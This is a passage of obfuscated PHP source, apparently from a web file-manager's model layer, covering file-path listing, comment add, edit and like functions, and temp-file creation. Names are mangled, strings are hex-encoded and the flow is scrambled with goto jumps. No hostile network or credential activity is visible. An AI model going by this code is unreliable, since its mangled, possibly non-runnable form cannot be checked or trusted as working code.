E½Ÿ­“Ô‚Ğ; dŒÄ§ƒ›³Ô: $aÄ‡»Ü³“ß =& $_SERVER[ÌîŠŸ]; $aÔŠÇ—© = array(); foreach ($B¡ÂØÌô‘ as $FóÀ‚ğø¹í) { if ($FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[9]] == self::TYPE_GROUP) { $aÔŠÇ—©[] = $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[2]]; } } goto ešõò‡ÀŸã; ešõò‡ÀŸã: if (!$aÔŠÇ—©) { return; } $Bô¢‹à‹Ó = array_to_keyvalue($B¡ÂØÌô‘, $aÄ‡»Ü³“ß[2]); $dóæº®¤„½ = Model($aÄ‡»Ü³“ß[91])->getSourceList($aÔŠÇ—©, $Bô¢‹à‹Ó); goto a‡œ‡²™ºš; E½Ÿ­“Ô‚Ğ: } public function groupPathDisplay(&$F„­¢ŠÉÅ) { goto E…ßö„‹Ø; B¦ß´Ø‚áœ: $F„­¢ŠÉÅ[$aè…¹Ä·‹[103]] = $aøõ¾—¾ëÖ . $Aà¤º½½Ã“[$aè…¹Ä·‹[37]][$aè…¹Ä·‹[2]]; goto FŠÊ¹ÎîÑ§; d¬ÆÚ©Öò: $d¡Àø÷ª = $this->parentLevelArray($Aà¤º½½Ã“[$aè…¹Ä·‹[98]]); $aøõ¾—¾ëÖ = $aè…¹Ä·‹[1]; foreach ($d¡Àø÷ª as $EŞ¼È‚ïéÙ) { $aÅ×—™Š…… = Model($aè…¹Ä·‹[97])->getInfo($EŞ¼È‚ïéÙ); $aøõ¾—¾ëÖ .= $aÅ×—™Š……[$aè…¹Ä·‹[37]][$aè…¹Ä·‹[2]] . $aè…¹Ä·‹[15]; } goto f£ï§ÍßÖĞ; f£ï§ÍßÖĞ: $F„­¢ŠÉÅ[$aè…¹Ä·‹[99]] = $Aà¤º½½Ã“[$aè…¹Ä·‹[100]]; $F„­¢ŠÉÅ[$aè…¹Ä·‹[23]] = $Aà¤º½½Ã“[$aè…¹Ä·‹[98]]; $F„­¢ŠÉÅ[$aè…¹Ä·‹[101]] = $Aà¤º½½Ã“[$aè…¹Ä·‹[102]]; goto B¦ß´Ø‚áœ; E…ßö„‹Ø: $aè…¹Ä·‹ =& $_SERVER[ÌîŠŸ]; if ($F„­¢ŠÉÅ[$aè…¹Ä·‹[9]] != self::TYPE_GROUP) { return; } $Aà¤º½½Ã“ = Model($aè…¹Ä·‹[97])->getInfo($F„­¢ŠÉÅ[$aè…¹Ä·‹[93]]); goto d¬ÆÚ©Öò; FŠÊ¹ÎîÑ§: } protected function _listAppendPath(&$eô¯‹İ‡ °) { goto e°Æ±”‘´Ø; C“Şâ¿Õ‡…: foreach ($eô¯‹İ‡ ° as &$CÇîŠË¦ù) { goto C†Ú«ê…»; b¬ñÎ÷ˆá²: $C´øÂïÄïá = trim($CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[106]], $A¡Ñ•Ü¿›ƒ[105]); if ($CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[100]] == $A¡Ñ•Ü¿›ƒ[108] && $C´øÂïÄïá) { $CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[32]] = $C´øÂïÄïá; } goto C¡ÊÏ‚ è; C†Ú«ê…»: $AÆù¼…‰òè = $this->parentLevelArray($CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[98]]); $FÀï›¤Šİ = $this->_listAppendPathRoot($CÇîŠË¦ù, $AÆù¼…‰òè); foreach ($AÆù¼…‰òè as $F³Š§õ›õ) { if (isset($B³‘ÈîØõØ[$F³Š§õ›õ])) { $FÀï›¤Šİ .= $B³‘ÈîØõØ[$F³Š§õ›õ] . $A¡Ñ•Ü¿›ƒ[105]; } } goto D¾ó“©¸¾…; D¾ó“©¸¾…: if ($AÆù¼…‰òè) { $FÀï›¤Šİ .= $CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[32]]; } if ($CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[6]]) { $FÀï›¤Šİ .= $A¡Ñ•Ü¿›ƒ[105]; } $CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[106]] = str_replace($A¡Ñ•Ü¿›ƒ[107], $A¡Ñ•Ü¿›ƒ[105], $FÀï›¤Šİ); goto b¬ñÎ÷ˆá²; C¡ÊÏ‚ è: } goto Eˆƒ„µâ·Ÿ; e°Æ±”‘´Ø: $A¡Ñ•Ü¿›ƒ =& $_SERVER[ÌîŠŸ]; $B³‘ÈîØõØ = array(); foreach ($eô¯‹İ‡ ° as &$CÇîŠË¦ù) { $B³‘ÈîØõØ[$CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[2]]] = $CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[32]]; $AÆù¼…‰òè = $this->parentLevelArray($CÇîŠË¦ù[$A¡Ñ•Ü¿›ƒ[98]]); array_shift($AÆù¼…‰òè); foreach ($AÆù¼…‰òè as $F³Š§õ›õ) { if (!isset($B³‘ÈîØõØ[$F³Š§õ›õ])) { $B³‘ÈîØõØ[$F³Š§õ›õ] = 0; } } } goto FÑ§˜¯ÈàÕ; FÑ§˜¯ÈàÕ: $fÒ§ˆøô˜ = array(); foreach ($B³‘ÈîØõØ as $cÎÊ«ì­ÎĞ => $bˆ·ÆŠÜ£ó) { if (!$bˆ·ÆŠÜ£ó) { $fÒ§ˆøô˜[] = $cÎÊ«ì­ÎĞ; } } if ($fÒ§ˆøô˜) { $Bğñ®ô–š— = array($A¡Ñ•Ü¿›ƒ[26] => array($A¡Ñ•Ü¿›ƒ[27], $fÒ§ˆøô˜)); $DçÛõòÇÒÕ = $this->field($A¡Ñ•Ü¿›ƒ[104])->where($Bğñ®ô–š—)->select(); $aÑ”Ç¥Æ = array_to_keyvalue($DçÛõòÇÒÕ, $A¡Ñ•Ü¿›ƒ[2], $A¡Ñ•Ü¿›ƒ[32]); $B³‘ÈîØõØ = array_merge_index($B³‘ÈîØõØ, $aÑ”Ç¥Æ); } goto C“Şâ¿Õ‡…; Eˆƒ„µâ·Ÿ: } protected function _listAppendPathRoot(&$D¡Æ°±Ø†İ, $AŒÎ°˜é­Á) { $BÂÔ¼§«×è =& $_SERVER[ÌîŠŸ]; $Cİ¬›‡’†¡ = $BÂÔ¼§«×è[1]; if ($D¡Æ°±Ø†İ[$BÂÔ¼§«×è[9]] == self::TYPE_USER) { if ($D¡Æ°±Ø†İ[$BÂÔ¼§«×è[93]] == USER_ID) { $Cİ¬›‡’†¡ = LNG($BÂÔ¼§«×è[109]); if (!$AŒÎ°˜é­Á) { $D¡Æ°±Ø†İ[$BÂÔ¼§«×è[32]] = $Cİ¬›‡’†¡; } } else { $B¥ˆÙÍã±é = Model($BÂÔ¼§«×è[110])->getInfoSimple($D¡Æ°±Ø†İ[$BÂÔ¼§«×è[93]]); $Cİ¬›‡’†¡ = $BÂÔ¼§«×è[111] . $B¥ˆÙÍã±é[$BÂÔ¼§«×è[32]] . $BÂÔ¼§«×è[112]; } } else { if ($D¡Æ°±Ø†İ[$BÂÔ¼§«×è[9]] == self::TYPE_GROUP) { $B¥ˆÙÍã±é = Model($BÂÔ¼§«×è[97])->getInfoSimple($D¡Æ°±Ø†İ[$BÂÔ¼§«×è[93]]); $Cİ¬›‡’†¡ = $B¥ˆÙÍã±é[$BÂÔ¼§«×è[32]]; } else { if ($D¡Æ°±Ø†İ[$BÂÔ¼§«×è[9]] == self::TYPE_SYSTEM) { $B¥ˆÙÍã±é = $this->sourceInfo($AŒÎ°˜é­Á[0], !0); $Cİ¬›‡’†¡ = $B¥ˆÙÍã±é[$BÂÔ¼§«×è[32]]; } } } $Cİ¬›‡’†¡ = $Cİ¬›‡’†¡ ? $BÂÔ¼§«×è[105] . $Cİ¬›‡’†¡ . $BÂÔ¼§«×è[105] : $BÂÔ¼§«×è[105]; return $Cİ¬›‡’†¡; } protected function _listAppendUser(&$AÛ³ƒ‘ÀÂº) { $dã¢Ø»Ì¸¾ =& $_SERVER[ÌîŠŸ]; $BÑ‚Âª·õ— = array_to_keyvalue($AÛ³ƒ‘ÀÂº, $dã¢Ø»Ì¸¾[1], $dã¢Ø»Ì¸¾[20]); $dä…¯ ôà¿ = array_to_keyvalue($AÛ³ƒ‘ÀÂº, $dã¢Ø»Ì¸¾[1], $dã¢Ø»Ì¸¾[21]); $E†¹ùÓµ’µ = array_merge($BÑ‚Âª·õ—, $dä…¯ ôà¿); $e×­«¬¹ÃÔ = Model($dã¢Ø»Ì¸¾[113])->userListInfo($E†¹ùÓµ’µ); foreach ($AÛ³ƒ‘ÀÂº as &$E¢İİåèò‹) { $AÔÌ—Ù°å = $E¢İİåèò‹[$dã¢Ø»Ì¸¾[20]]; $E¢İİåèò‹[$dã¢Ø»Ì¸¾[20]] = $e×­«¬¹ÃÔ[$AÔÌ—Ù°å] ? $e×­«¬¹ÃÔ[$AÔÌ—Ù°å] : !1; $AÔÌ—Ù°å = $E¢İİåèò‹[$dã¢Ø»Ì¸¾[21]]; $E¢İİåèò‹[$dã¢Ø»Ì¸¾[21]] = $e×­«¬¹ÃÔ[$AÔÌ—Ù°å] ? $e×­«¬¹ÃÔ[$AÔÌ—Ù°å] : !1; if ($E¢İİåèò‹[$dã¢Ø»Ì¸¾[62]] && $E¢İİåèò‹[$dã¢Ø»Ì¸¾[62]][$dã¢Ø»Ì¸¾[114]]) { $D»“ÆÍºÜ» = $GLOBALS[$dã¢Ø»Ì¸¾[115]][$dã¢Ø»Ì¸¾[116]]; if ($E¢İİåèò‹[$dã¢Ø»Ì¸¾[62]][$dã¢Ø»Ì¸¾[117]] <= time() - $D»“ÆÍºÜ») { $this->metaSet($E¢İİåèò‹[$dã¢Ø»Ì¸¾[2]], $dã¢Ø»Ì¸¾[114], null); $this->metaSet($E¢İİåèò‹[$dã¢Ø»Ì¸¾[2]], $dã¢Ø»Ì¸¾[117], null); unset($E¢İİåèò‹[$dã¢Ø»Ì¸¾[62]][$dã¢Ø»Ì¸¾[114]]); continue; } $AêÉ°ÊƒèÒ = $E¢İİåèò‹[$dã¢Ø»Ì¸¾[62]][$dã¢Ø»Ì¸¾[114]]; $E¢İİåèò‹[$dã¢Ø»Ì¸¾[62]][$dã¢Ø»Ì¸¾[118]] = Model($dã¢Ø»Ì¸¾[113])->getInfoSimpleOuter($AêÉ°ÊƒèÒ); } } } public function parentLevelArray($fõİ¦Ù¬İ) { $b ¤²™Õ¨ =& $_SERVER[ÌîŠŸ]; $fõİ¦Ù¬İ = explode($b ¤²™Õ¨[15], trim($fõİ¦Ù¬İ, $b ¤²™Õ¨[15])); return array_remove_value($fõİ¦Ù¬İ, $b ¤²™Õ¨[108]); } public function listAll($b²…Î§ùéÍ) { goto A·Ï®ø¦³Õ; Dç´Üğçî: $BË—›½Îˆ = $bÂÕª–¹‰[123]; $fçÊ®ª—Ú– = "\114\105\106\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\151\157\137\146\x69\x6c\145\x20\x66\x69\154\x65\x20\157\x6e\x20\x73\157\x75\162\143\x65\x2e\146\151\x6c\145\111\x44\x20\75\40\146\x69\x6c\145\x2e\146\151\154\145\111\x44"; $e½Ëš—Î¹‰ = $this->alias($bÂÕª–¹‰[124])->field($BË—›½Îˆ)->where($aÈğÂ¦ğ‹İ)->join($fçÊ®ª—Ú–)->select(); goto Dƒ¨á•İØ; dÅ†åØì‰¹: return $AªÓ“§»’Î; goto d£ƒè–Ü ; Dƒ¨á•İØ: $e½Ëš—Î¹‰ = array_to_keyvalue($e½Ëš—Î¹‰, $bÂÕª–¹‰[2]); $Fƒ‚éÁõŠ = "\57{$Aº‚ŠˆŠøë[$bÂÕª–¹‰[32]]}\x2f"; $Fƒ‚éÁõŠ = $Fƒ‚éÁõŠ == $bÂÕª–¹‰[107] ? $bÂÕª–¹‰[105] : $Fƒ‚éÁõŠ; goto Aõ‹ŸùÅĞ¹; Aõ‹ŸùÅĞ¹: $AªÓ“§»’Î = array(array($bÂÕª–¹‰[33] => $Fƒ‚éÁõŠ, $bÂÕª–¹‰[125] => 1, $bÂÕª–¹‰[126] => 0)); if ($Fƒ‚éÁõŠ == $bÂÕª–¹‰[105]) { $AªÓ“§»’Î = array(); } foreach ($e½Ëš—Î¹‰ as $A•ŞğÚË => $e‘ï¯Ê‚‘) { goto b¬•ä‘‡Ï”; b¬•ä‘‡Ï”: $d”Äà©ªóË = $this->parentLevelArray($e‘ï¯Ê‚‘[$bÂÕª–¹‰[98]]); array_shift($d”Äà©ªóË); $c¦æºê…Äà = $Fƒ‚éÁõŠ; goto e½èµ¢ÕÔƒ; e½èµ¢ÕÔƒ: for ($B¡½¥àŸÃĞ = 0; $B¡½¥àŸÃĞ < count($d”Äà©ªóË); $B¡½¥àŸÃĞ++) { $c¦æºê…Äà .= $e½Ëš—Î¹‰[$d”Äà©ªóË[$B¡½¥àŸÃĞ]][$bÂÕª–¹‰[32]] . $bÂÕª–¹‰[105]; } $c¦æºê…Äà .= $e‘ï¯Ê‚‘[$bÂÕª–¹‰[32]]; if ($e‘ï¯Ê‚‘[$bÂÕª–¹‰[6]]) { $c¦æºê…Äà .= $bÂÕª–¹‰[105]; } goto bè™åğÉØì; bè™åğÉØì: $dÓœÑ‰ê· = array($bÂÕª–¹‰[33] => str_replace($bÂÕª–¹‰[107], $bÂÕª–¹‰[105], $c¦æºê…Äà), $bÂÕª–¹‰[125] => intval($e‘ï¯Ê‚‘[$bÂÕª–¹‰[6]])); if (!$e‘ï¯Ê‚‘[$bÂÕª–¹‰[6]]) { $dÓœÑ‰ê·[$bÂÕª–¹‰[8]] = $e‘ï¯Ê‚‘[$bÂÕª–¹‰[4]]; $dÓœÑ‰ê·[$bÂÕª–¹‰[22]] = $e‘ï¯Ê‚‘[$bÂÕª–¹‰[22]]; } $AªÓ“§»’Î[] = $dÓœÑ‰ê·; goto c²ŒóÑÂ·Ï; c²ŒóÑÂ·Ï: } goto dÅ†åØì‰¹; A·Ï®ø¦³Õ: $bÂÕª–¹‰ =& $_SERVER[ÌîŠŸ]; $Aº‚ŠˆŠøë = $this->sourceInfo($b²…Î§ùéÍ); $aÈğÂ¦ğ‹İ = array($bÂÕª–¹‰[119] => array($bÂÕª–¹‰[120], $Aº‚ŠˆŠøë[$bÂÕª–¹‰[98]] . $b²…Î§ùéÍ . $bÂÕª–¹‰[121]), $bÂÕª–¹‰[122] => 0); goto Dç´Üğçî; d£ƒè–Ü : } } goto EğÆøŠäˆ†; fŒöËå¥Ü: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\155\145" => "\x63\157\x6d\x6d\x65\x6e\x74\x5f\155\x65\164\141", "\x6d\x65\164\141\106\151\145\x6c\144" => "\x63\x6f\155\155\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($A¹•Ó“–’) { $Eö‰±’¢Ö =& $_SERVER[ÍÓÖ€°å]; if ($A¹•Ó“–’[$Eö‰±’¢Ö[1544]]) { $cÛé…ïãâ— = $this->where(array($Eö‰±’¢Ö[1545] => $A¹•Ó“–’[$Eö‰±’¢Ö[1544]]))->find(); if (!$cÛé…ïãâ— || $cÛé…ïãâ—[$Eö‰±’¢Ö[384]] != $A¹•Ó“–’[$Eö‰±’¢Ö[384]] || $cÛé…ïãâ—[$Eö‰±’¢Ö[386]] != $A¹•Ó“–’[$Eö‰±’¢Ö[386]]) { return !1; } $this->where(array($Eö‰±’¢Ö[1545] => $A¹•Ó“–’[$Eö‰±’¢Ö[1544]]))->setAdd($Eö‰±’¢Ö[1546], 1); } return $this->add($A¹•Ó“–’); } public function remove($DÎ…ŠÖ„¤æ) { $c¨èâ¦¡Ï± =& $_SERVER[ÍÓÖ€°å]; $aùó×’£ã™ = array($c¨èâ¦¡Ï±[1545] => $DÎ…ŠÖ„¤æ); $DÎÑ¡©óÖ = $this->where($aùó×’£ã™)->find(); if ($DÎÑ¡©óÖ[$c¨èâ¦¡Ï±[1544]]) { $this->where(array($c¨èâ¦¡Ï±[1545] => $DÎÑ¡©óÖ[$c¨èâ¦¡Ï±[1544]]))->setAdd($c¨èâ¦¡Ï±[1546], -1); } return $this->where($aùó×’£ã™)->delete(); } public function edit($Dà½­áá¥ª, $Bºå™ÒçÂÌ) { $AÒŠÔ…£½ö =& $_SERVER[ÍÓÖ€°å]; $f’È†ÉÑğ = array($AÒŠÔ…£½ö[1545] => $Dà½­áá¥ª); return $this->where($f’È†ÉÑğ)->save(array($AÒŠÔ…£½ö[1547] => $Bºå™ÒçÂÌ)); } public function prasise($Bñèˆ¾™Ö) { $F¹šÍİµ®‹ =& $_SERVER[ÍÓÖ€°å]; $dñÈµİÁì» = Model($F¹šÍİµ®‹[1548]); $aôğİ¦”õØ = array($F¹šÍİµ®‹[1545] => $Bñèˆ¾™Ö, $F¹šÍİµ®‹[1053] => USER_ID); $dŠ³¶ÁÒÅÄ = $dñÈµİÁì»->where($aôğİ¦”õØ)->find(); if (!$dŠ³¶ÁÒÅÄ) { $dñÈµİÁì»->add($aôğİ¦”õØ); $c‰â¿ƒßŠ‘ = $this->where(array($F¹šÍİµ®‹[1545] => $Bñèˆ¾™Ö))->setAdd($F¹šÍİµ®‹[1549], 1); } else { $dñÈµİÁì»->where($aôğİ¦”õØ)->delete(); $c‰â¿ƒßŠ‘ = $this->where(array($F¹šÍİµ®‹[1545] => $Bñèˆ¾™Ö))->setAdd($F¹šÍİµ®‹[1549], -1); } return $c‰â¿ƒßŠ‘; } public function targetInfo($d°íç„‹×‰, $DÉ¾ß»É–) { goto Eİ¶Ğ‡¨ö—; eùØ¾µÖï×: return $b¾ƒ²¶Î; goto e»ë–©™‰; Eİ¶Ğ‡¨ö—: $e’·ŒëÖÈ =& $_SERVER[ÍÓÖ€°å]; $DÖºà“İ´‚ = array($e’·ŒëÖÈ[383] => $d°íç„‹×‰, $e’·ŒëÖÈ[385] => $DÉ¾ß»É–); $d˜É’İöõ  = $this->where($DÖºà“İ´‚)->count(); goto A…Œ°Û„¿¤; A…Œ°Û„¿¤: $e‚ôøƒÜè… = "\122\111\107\x48\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\x63\157\x6d\155\x65\x6e\164\137\x70\x72\141\151\x73\x65\40\163\x74\141\162\x20\x6f\x6e\x20\143\x6f\x6d\x6d\x65\x6e\164\56\x63\x6f\155\x6d\x65\156\164\111\104\40\x3d\40\x73\x74\141\x72\56\x63\x6f\155\x6d\x65\156\164\x49\104"; $ašè˜ÆæŠÔ = $this->alias($e’·ŒëÖÈ[332])->where($DÖºà“İ´‚)->join($e‚ôøƒÜè…, $e’·ŒëÖÈ[1550])->count(); $b¾ƒ²¶Î = array($e’·ŒëÖÈ[1551] => $d˜É’İöõ , $e’·ŒëÖÈ[1552] => $ašè˜ÆæŠÔ); goto eùØ¾µÖï×; e»ë–©™‰: } public function listData($bãñ÷›ËÍ«) { $D²³¦°Ó¯ˆ =& $_SERVER[ÍÓÖ€°å]; if (isset($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1553]])) { if ($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1553]]) { $bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1554]] = array($D²³¦°Ó¯ˆ[683], intval($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1553]])); } unset($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1553]]); } if (isset($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1555]])) { if ($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1555]]) { $bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1554]] = array($D²³¦°Ó¯ˆ[680], intval($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1555]])); } unset($bãñ÷›ËÍ«[$D²³¦°Ó¯ˆ[1555]]); } return $this->_listData($bãñ÷›ËÍ«); } private function _listData($aå©àìØñŒ) { $d¦„ß³«¹ =& $_SERVER[ÍÓÖ€°å]; $d‰†æÓ¶…Ğ = $this->where($aå©àìØñŒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($d‰†æÓ¶…Ğ[$d¦„ß³«¹[345]]); $this->_listAppendUser($d‰†æÓ¶…Ğ[$d¦„ß³«¹[345]]); $this->_listAppendMeta($d‰†æÓ¶…Ğ[$d¦„ß³«¹[345]]); return $d‰†æÓ¶…Ğ; } private function _makeOrder() { $b¬ğƒ¬…ÍÂ =& $_SERVER[ÍÓÖ€°å]; $a»£–“áÅâ = array($b¬ğƒ¬…ÍÂ[1549], $b¬ğƒ¬…ÍÂ[1546], $b¬ğƒ¬…ÍÂ[175]); $cøºÃñÂØ³ = Input::get($b¬ğƒ¬…ÍÂ[1556], $b¬ğƒ¬…ÍÂ[7], $b¬ğƒ¬…ÍÂ[1557], $a»£–“áÅâ); $Fé½ìÖìç¡ = Input::get($b¬ğƒ¬…ÍÂ[1558], $b¬ğƒ¬…ÍÂ[7], $b¬ğƒ¬…ÍÂ[1055], array($b¬ğƒ¬…ÍÂ[1559], $b¬ğƒ¬…ÍÂ[1560])); $FÇ”÷…ñ¼œ = $cøºÃñÂØ³ . $b¬ğƒ¬…ÍÂ[50] . $Fé½ìÖìç¡; return $this->order($FÇ”÷…ñ¼œ); } private function _listAppendParent(&$A… ”º”Ò£) { goto Cñ¨¶Ÿó ; fÎ«‰ÃÄÎï: if (!$bğÖÏù†ª†) { return; } $Fª³Ğ¾ìƒ = $this->where(array($b÷ÏîŞ‡[1545] => array($b÷ÏîŞ‡[7], $bğÖÏù†ª†)))->select(); $Fª³Ğ¾ìƒ = array_to_keyvalue($Fª³Ğ¾ìƒ, $b÷ÏîŞ‡[1554]); goto aİ÷´¯èóõ; aİ÷´¯èóõ: foreach ($A… ”º”Ò£ as &$EöÆ‰êÊ¥) { if (isset($Fª³Ğ¾ìƒ[$EöÆ‰êÊ¥[$b÷ÏîŞ‡[1544]]])) { $EöÆ‰êÊ¥[$b÷ÏîŞ‡[1561]] = $Fª³Ğ¾ìƒ[$EöÆ‰êÊ¥[$b÷ÏîŞ‡[1544]]]; } } goto E»ƒëÀÉÃ‹; Cñ¨¶Ÿó : $b÷ÏîŞ‡ =& $_SERVER[ÍÓÖ€°å]; $bğÖÏù†ª† = array_unique(array_to_keyvalue($A… ”º”Ò£, $b÷ÏîŞ‡[33], $b÷ÏîŞ‡[1544])); $bğÖÏù†ª† = array_remove_value($bğÖÏù†ª†, $b÷ÏîŞ‡[393]); goto fÎ«‰ÃÄÎï; E»ƒëÀÉÃ‹: } private function _listAppendUser(&$D¦â»…‘) { goto d¡ö•ø…¨‹; Aù‹­ö‹¡ë: foreach ($D¦â»…‘ as &$E˜Ü¿»òŠ÷) { $E˜Ü¿»òŠ÷[$e°¹Çºó–‰[407]] = $E¾ïí¸ˆğ[$E˜Ü¿»òŠ÷[$e°¹Çºó–‰[1062]]]; if (isset($E˜Ü¿»òŠ÷[$e°¹Çºó–‰[1561]])) { $E˜Ü¿»òŠ÷[$e°¹Çºó–‰[1561]][$e°¹Çºó–‰[407]] = $E¾ïí¸ˆğ[$E˜Ü¿»òŠ÷[$e°¹Çºó–‰[1561]][$e°¹Çºó–‰[1062]]]; } } goto b¼“¾ˆ¾ö¬; E™ŒÈ—²Ë: if (count($BÊ¬áÀÁÍù) == 0) { return; } foreach ($D¦â»…‘ as $E˜Ü¿»òŠ÷) { if (isset($E˜Ü¿»òŠ÷[$e°¹Çºó–‰[1561]])) { $BÊ¬áÀÁÍù[] = $E˜Ü¿»òŠ÷[$e°¹Çºó–‰[1561]][$e°¹Çºó–‰[1062]]; } } $E¾ïí¸ˆğ = Model($e°¹Çºó–‰[1452])->userListInfo($BÊ¬áÀÁÍù); goto Aù‹­ö‹¡ë; d¡ö•ø…¨‹: $e°¹Çºó–‰ =& $_SERVER[ÍÓÖ€°å]; $BÊ¬áÀÁÍù = array_unique(array_to_keyvalue($D¦â»…‘, $e°¹Çºó–‰[33], $e°¹Çºó–‰[1062])); $BÊ¬áÀÁÍù = array_remove_value($BÊ¬áÀÁÍù, $e°¹Çºó–‰[393]); goto E™ŒÈ—²Ë; b¼“¾ˆ¾ö¬: } private function _listAppendMeta(&$f‡œÏîŸÃ“) { goto dí˜œéŠ«; dí˜œéŠ«: $dª²«¦ƒ»İ =& $_SERVER[ÍÓÖ€°å]; $fªíİ‚’âÒ = array_unique(array_to_keyvalue($f‡œÏîŸÃ“, $dª²«¦ƒ»İ[33], $dª²«¦ƒ»İ[1554])); $fªíİ‚’âÒ = array_remove_value($fªíİ‚’âÒ, $dª²«¦ƒ»İ[393]); goto bŒ‰ª„¦İå; b¯Åäİ÷Ö½: if (!$a¼¯ø©Â») { return !1; } foreach ($f‡œÏîŸÃ“ as &$E„ÂíßØä) { $E„ÂíßØä[$dª²«¦ƒ»İ[1562]] = $a¼¯ø©Â»[$E„ÂíßØä[$dª²«¦ƒ»İ[1554]]]; if (isset($E„ÂíßØä[$dª²«¦ƒ»İ[1561]])) { $E„ÂíßØä[$dª²«¦ƒ»İ[1561]][$dª²«¦ƒ»İ[1562]] = $a¼¯ø©Â»[$E„ÂíßØä[$dª²«¦ƒ»İ[1561]][$dª²«¦ƒ»İ[1554]]]; } } goto Céá–©‰ë; bŒ‰ª„¦İå: if (!$fªíİ‚’âÒ) { return; } foreach ($f‡œÏîŸÃ“ as $E„ÂíßØä) { if (isset($E„ÂíßØä[$dª²«¦ƒ»İ[1561]])) { $fªíİ‚’âÒ[] = $E„ÂíßØä[$dª²«¦ƒ»İ[1561]][$dª²«¦ƒ»İ[1554]]; } } $a¼¯ø©Â» = $this->metaList($fªíİ‚’âÒ); goto b¯Åäİ÷Ö½; Céá–©‰ë: } private function metaList($aùïˆ˜“Ï…) { goto DêÔ÷ÀØíµ; DêÔ÷ÀØíµ: $d›°¿‘Â×¯ =& $_SERVER[ÍÓÖ€°å]; if (!$aùïˆ˜“Ï…) { return array(); } $E‹‹ØÜ÷áŞ = array($d›°¿‘Â×¯[1554] => array($d›°¿‘Â×¯[7], $aùïˆ˜“Ï…)); goto eˆ§ˆ´¶ÕÏ; eˆ§ˆ´¶ÕÏ: $CĞ®‰²Ò’Ø = Model($d›°¿‘Â×¯[1563])->where($E‹‹ØÜ÷áŞ)->select(); $CĞ®‰²Ò’Ø = array_to_keyvalue_group($CĞ®‰²Ò’Ø, $d›°¿‘Â×¯[1554]); foreach ($CĞ®‰²Ò’Ø as $Cñ§Á…–§› => $B…ÑÔÇ‚Ô•) { $a¸îïô†Ñ¬ = array(); foreach ($B…ÑÔÇ‚Ô• as $fİ™œ×ÕÛä) { $a¸îïô†Ñ¬[$fİ™œ×ÕÛä[$d›°¿‘Â×¯[88]]] = $fİ™œ×ÕÛä[$d›°¿‘Â×¯[348]]; } $CĞ®‰²Ò’Ø[$Cñ§Á…–§›] = $a¸îïô†Ñ¬; } goto aÒ…öˆ£¥Ù; aÒ…öˆ£¥Ù: return $CĞ®‰²Ò’Ø ? $CĞ®‰²Ò’Ø : array(); goto BæÌª©Î¿º; BæÌª©Î¿º: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\154\x65"; public function addFileByContent($f‰õ—Ó„ó¿ = '', $C¨Ö®ËÁá  = '') { goto EºÇïóëÉ—; bé¡áÔô¼Æ: if (file_exists($f²½’ÓˆŸÔ)) { @unlink($f²½’ÓˆŸÔ); } return $C­¢ÔÎ¦Ø; goto fçƒ›°à; E®¹¢šŒÜÔ: $f²½’ÓˆŸÔ = $BÀ„Ô£“è— . $a„×•Ò¼ò­[1565] . rand_string(16); file_put_contents($f²½’ÓˆŸÔ, $f‰õ—Ó„ó¿); $C­¢ÔÎ¦Ø = $this->addFile($f²½’ÓˆŸÔ, $C¨Ö®ËÁá , !0); goto bé¡áÔô¼Æ; EºÇïóëÉ—: $a„×•Ò¼ò­ =& $_SERVER[ÍÓÖ€°å]; $BÀ„Ô£“è— = TEMP_PATH . $a„×•Ò¼ò­[1564]; if (!is_dir($BÀ„Ô£“è—)) { mk_dir($BÀ„Ô£“è—); } goto E®¹¢šŒÜÔ; fçƒ›°à: } public function createFileName($eÔ„±•£‡ï) { goto c‚‹¢Å³â; BÁŒèŠÉ•Ô: if (!$DÜõôÅ²é && !Cache::get($fà¥¶ƒº)) { $DÜõôÅ²é = !0; $C†ÙÃ×Ú§œ = IO::mkdir($cæ†ÙØ è); if (!IO::exist($C†ÙÃ×Ú§œ . $fåè­…ïğÀ[1567])) { IO::mkfile($C†ÙÃ×Ú§œ . $fåè­…ïğÀ[1567]); } Cache::set($fà¥¶ƒº, 1, 3600 * 2); } return $EÇŒíˆ‡Ïù; goto cŠŠ‚Ì™Ë; dšĞ½»®¦ª: $cæ†ÙØ è = $D¾Œ¯ÔÎ»->pathFather($EÇŒíˆ‡Ïù); static $DÜõôÅ²é = false; $fà¥¶ƒº = $fåè­…ïğÀ[1566] . md5($cæ†ÙØ è); goto BÁŒèŠÉ•Ô; c‚‹¢Å³â: $fåè­…ïğÀ =& $_SERVER[ÍÓÖ€°å]; $D¾Œ¯ÔÎ» = IO::init($fåè­…ïğÀ[8]); $EÇŒíˆ‡Ïù = $this->makeFilePath($eÔ„±•£‡ï, $D¾Œ¯ÔÎ»); goto dšĞ½»®¦ª; cŠŠ‚Ì™Ë: } public function makeFilePath($B©±¡é™Šª, $D¡„Éá¹ª) { goto e¼©ğ¹öğÒ; e¼©ğ¹öğÒ: 